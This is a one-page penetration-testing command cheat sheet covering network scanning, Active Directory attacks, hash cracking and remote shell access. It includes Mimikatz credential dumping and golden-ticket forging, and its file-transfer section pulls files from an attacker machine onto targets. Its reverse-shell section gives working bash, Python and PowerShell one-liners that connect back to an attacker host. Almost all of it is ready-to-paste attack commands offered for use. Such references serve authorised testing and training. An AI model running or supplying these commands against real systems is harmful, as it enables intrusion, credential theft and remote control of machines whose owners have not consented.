# Master Command Reference

Quick-access cheatsheet. One page, everything critical.

---

## Scanning & Enumeration

```sh
# Fast all-ports scan
nmap -T4 -p- --min-rate 5000 <ip> -oN ports.txt

# Detailed scan on open ports
nmap -sC -sV -p <ports> <ip> -oN detailed.txt

# Rustscan → Nmap
rustscan -a <ip> -- -A

# SMB signing check (find relay targets)
nmap --script=smb2-security-mode.nse -p445 <ip/cidr>

# Host discovery
netdiscover -r <cidr>
nmap -sn <cidr>

# enum4linux
enum4linux -a <ip>
```

---

## NetExec (nxc)

```sh
# Host + SMB info
nxc smb <cidr>

# Shares (null session)
nxc smb <ip> -u '' -p '' --shares

# RID brute (user enum)
nxc smb <ip> -u '' -p '' --rid-brute

# Password spray
nxc smb <cidr> -u users.txt -p 'Password123' --continue-on-success

# Pass the hash
nxc smb <cidr> -u admin -H <hash> --local-auth

# Dump SAM
nxc smb <ip> -u admin -H <hash> --local-auth --sam

# Dump LSA
nxc smb <ip> -u admin -H <hash> --local-auth --lsa
```

---

## Active Directory

```sh
# LLMNR poisoning
sudo responder -I eth0 -dPv

# SMB relay
sudo ntlmrelayx.py -tf targets.txt -smb2support

# IPv6 attack
sudo mitm6 -d domain.local
ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh fake.domain.local -l lootme

# Kerberoasting
GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC-IP> -request

# AS-REP Roasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat

# secretsdump
secretsdump.py DOMAIN/user:pass@<ip>
secretsdump.py DOMAIN/user:pass@<DC-IP> -just-dc-ntlm

# BloodHound collection
bloodhound-python -d domain.local -u user -p pass -ns <DC-IP> -c all

# ldapdomaindump
python3 -m ldapdomaindump ldaps://<DC-IP> -u 'DOMAIN\user' -p 'pass'
```

---

## Password Cracking (hashcat)

```sh
# NTLMv2 (Responder captures)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM (SAM/NTDS.dit)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast TGS
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# DCC2 (cached domain creds)
hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat --show -m <mode> hashes.txt
```

---

## Shell Access

```sh
# Evil-WinRM (WinRM)
evil-winrm -i <ip> -u user -p pass
evil-winrm -i <ip> -u user -H <hash>

# Impacket shells
psexec.py DOMAIN/user:pass@<ip>
wmiexec.py DOMAIN/user:pass@<ip>
wmiexec.py DOMAIN/user@<ip> -hashes :<hash>

# xfreerdp
xfreerdp /u:user /p:pass /v:<ip>
xfreerdp /u:user /pth:<hash> /v:<ip>
```

---

## Mimikatz

```sh
privilege::debug
sekurlsa::logonPasswords
lsadump::sam
lsadump::dcsync /domain:domain.local /user:krbtgt
kerberos::golden /User:Fake /domain:domain.local /sid:<SID> /krbtgt:<hash> /id:500 /ptt
misc::cmd
```

---

## Reverse Shells

```sh
# Listener on Kali
nc -lvnp 4444

# Bash
bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<KALI-IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('<KALI-IP>',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

See [Reverse Shells](reverse-shells.md) for the full list.

---

## File Transfer

```sh
# Python HTTP server (Kali)
python3 -m http.server 8080

# Download on Linux target
wget http://<KALI>:8080/file
curl -O http://<KALI>:8080/file

# Download on Windows target
certutil -urlcache -split -f http://<KALI>:8080/file file
iwr -uri http://<KALI>:8080/file -OutFile file
```

---

## PrivEsc Quick Checks

### Linux
```sh
sudo -l
find / -perm -u=s -type f 2>/dev/null    # SUID
cat /etc/crontab
getcap -r / 2>/dev/null
```

### Windows
```cmd
whoami /priv
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
